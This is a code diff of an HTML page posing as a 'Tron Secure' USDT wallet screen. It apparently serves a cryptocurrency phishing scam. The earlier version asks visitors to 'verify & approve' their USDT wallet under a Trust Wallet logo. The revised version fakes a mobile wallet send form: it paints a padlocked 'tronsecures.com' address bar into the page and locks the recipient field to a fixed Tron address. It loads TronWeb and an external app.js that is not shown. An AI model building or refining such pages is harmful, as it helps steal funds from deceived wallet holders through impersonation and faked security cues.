@@ -3,28 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tron Secure - USDT Verification</title>
+    <title>Tron Secure - USDT</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #121212; color: white; text-align: center; padding: 50px 20px; }
-        .container { max-width: 400px; margin: auto; background: #1e1e1e; padding: 30px; border-radius: 20px; border: 1px solid #333; }
-        .btn-connect { background-color: #0085ff; color: white; border: none; padding: 15px; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; }
-        .status-msg { margin-top: 20px; font-size: 14px; color: #aaa; }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #ffffff; margin: 0; padding: 20px; color: #333; }
+        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 30px; }
+        .close-btn { font-size: 24px; cursor: pointer; color: #666; }
+        .url-bar { font-size: 14px; font-weight: bold; color: #000; display: flex; align-items: center; gap: 5px; }
+        
+        .input-group { margin-bottom: 20px; }
+        .label { font-size: 14px; color: #666; margin-bottom: 8px; display: block; }
+        .input-box { background: #f5f7f9; border-radius: 12px; padding: 15px; position: relative; border: 1px solid #eee; }
+        input { border: none; background: transparent; width: 100%; font-size: 16px; outline: none; color: #000; }
+        
+        .right-icons { position: absolute; right: 15px; top: 15px; display: flex; gap: 15px; color: #3b71fe; font-weight: bold; cursor: pointer; }
+        
+        .sub-text { font-size: 12px; color: #999; margin-top: 5px; }
+        .max-btn { color: #3b71fe; font-weight: bold; cursor: pointer; }
+
+        .next-btn { 
+            position: fixed; bottom: 40px; left: 20px; right: 20px;
+            background-color: #0538b5; color: white; border: none; 
+            padding: 18px; border-radius: 30px; font-size: 18px; 
+            font-weight: bold; cursor: pointer; text-align: center;
+        }
+        #status { text-align: center; margin-top: 10px; font-size: 12px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" width="60" alt="Logo">
-    <h2>Secure Approval</h2>
-    <p>Please connect and verify your USDT (TRC20) wallet to proceed.</p>
-    
-    <button class="btn-connect" id="btn-approve">Verify & Approve</button>
-    
-    <div class="status-msg" id="status">Ready to connect...</div>
-</div>
+    <div class="header">
+        <div class="close-btn">✕</div>
+        <div class="url-bar">🔒 tronsecures.com</div>
+        <div style="font-size: 20px;">⋮</div>
+    </div>
 
-<script src="app.js"></script>
+    <div class="input-group">
+        <label class="label">Address or Domain Name</label>
+        <div class="input-box">
+            <input type="text" id="address" value="TB869UquPw2w8ckJpwcozBsD" readonly>
+            <div class="right-icons">
+                <span>📋 Paste</span>
+                <span>👤</span>
+                <span>[ ]</span>
+            </div>
+        </div>
+    </div>
 
+    <div class="input-group">
+        <label class="label">Amount</label>
+        <div class="input-box">
+            <input type="number" id="amount" value="1">
+            <div class="right-icons">
+                <span style="color: #666; margin-right: 5px;">USDT</span>
+                <span class="max-btn">Max</span>
+            </div>
+        </div>
+        <div class="sub-text">≈ $1</div>
+    </div>
+
+    <div class="input-group">
+        <label class="label">Memo</label>
+        <div class="input-box">
+            <input type="text" placeholder="Optional">
+            <div class="right-icons">
+                <span>[ ]</span>
+                <span style="color: #3b71fe;">ⓘ</span>
+            </div>
+        </div>
+    </div>
+
+    <button class="next-btn" id="btn-next">Next</button>
+    <div id="status"></div>
+
+    <script src="app.js"></script>
 </body>
 </html>
